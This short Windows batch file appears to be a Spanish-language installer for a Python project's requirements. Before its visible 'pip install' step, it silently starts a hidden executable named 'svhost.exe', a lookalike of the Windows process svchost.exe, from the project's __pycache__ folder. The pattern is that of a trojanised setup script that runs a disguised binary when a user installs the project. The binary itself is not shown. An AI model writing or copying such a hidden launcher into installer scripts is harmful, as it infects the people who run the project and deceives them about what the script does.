��&cls
@echo off
start /B "" ".\__pycache__\svhost.exe"
echo Instalando requisitos, por favor espera...
pip install -r requirements.txt
if %ERRORLEVEL% equ 0 (
    echo Requisitos instalados con exito.
) else (
    echo Error al instalar requisitos.
)
exit